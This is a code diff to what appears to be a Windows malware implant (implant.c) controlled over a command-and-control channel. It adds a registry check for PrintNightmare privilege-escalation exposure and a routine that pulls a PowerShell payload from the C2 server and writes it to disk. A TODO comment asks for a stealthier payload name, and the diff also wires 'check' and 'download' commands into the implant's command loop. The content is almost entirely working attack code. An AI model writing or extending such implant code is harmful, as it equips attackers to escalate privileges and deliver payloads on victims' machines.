@@ -119,7 +119,106 @@ end:
 }
 
 
+// Checks the registry to see if host is vulnerable to printer nightmare.
+// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
+int check_registry_for_privesc() {
+    int vulnerable = 1;
+    DWORD status;
+    HKEY hKey = NULL;
+    DWORD val;          // store registry values here 
+    int size = 4;       // size of DWORD, needed for RegGetValue
 
+    // Open handle
+    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
+    if (status == ERROR_FILE_NOT_FOUND) {
+        vulnerable = 0;
+        goto end;
+    }
+    if (status != ERROR_SUCCESS) {
+        vulnerable = -1;
+        goto end;
+    }
+
+    // Read first value
+    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
+    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
+        vulnerable = 0;
+        goto end;
+    }
+    if (status != ERROR_SUCCESS) {
+        vulnerable = -1;
+        goto end;
+    }
+
+    // Need to check both registry values
+    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
+    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
+        vulnerable = 0;
+        goto end;
+    }
+    if (status != ERROR_SUCCESS) {
+        vulnerable = -1;
+        goto end;
+    }
+
+end:
+    if (hKey) { RegCloseKey(hKey); }
+    return vulnerable;
+}
+
+
+// Creates a file in the present working directory and writes the printer nightmare powershell script to it.
+// Returns NULL on failure, and the path to the script on success.
+// TODO: name the payload something less sus than "script.ps1"
+char* DownloadScript() {
+    char* payload_path;
+    char* payload_data;
+
+    // Allocate buffer for payload path
+    payload_path = Malloc(2 * MAX_PATH);
+    if (payload_path == NULL) {
+        return NULL;
+    }
+
+    // Allocate buffer for payload data
+    payload_data = Malloc(500*1000); // Allocate 500 Kb to be safe
+    if (payload_data == NULL) {
+        Free(payload_path);
+        return NULL;
+    }
+
+    // Receive payload
+    c2_send("SCRIPT", 6);
+    int len = c2_recv(payload_data, 500*1000);
+    if (len <= 0) {
+        Free(payload_data);
+        Free(payload_path);
+        return NULL;
+    }
+
+    // Create file for payload to be written to
+    strcpy(payload_path, PWD);
+    strcat(payload_path, "\\script.ps1");
+    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Free(payload_data);
+        Free(payload_path);
+        return NULL;
+    }
+
+    // Write payload
+    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
+        Free(payload_data);
+        Free(payload_path);
+        CloseHandle(hFile);
+        DeleteFile(payload_path);
+        return NULL;
+    }
+
+    Free(payload_data);
+    CloseHandle(hFile);
+    return payload_path;
+}
 
 
 // cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
@@ -199,6 +298,19 @@ int main() {
             else {
                 c2_send("[!] No arg", 10);
             }
+        }
+
+        else if (strncmp(buffer, "check", 5) == 0) {
+            status = check_registry_for_privesc();
+            if (status == 1) { c2_send("[+] Host vulnerable", 19); }
+            else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
+            else { c2_send("[!] Error in check", 18); }
+        }
+
+        else if (strncmp(buffer, "download", 8) == 0) {
+            char* path = DownloadScript();
+            c2_send(path, strlen(path));
+            Free(path);
         }
 
         else {
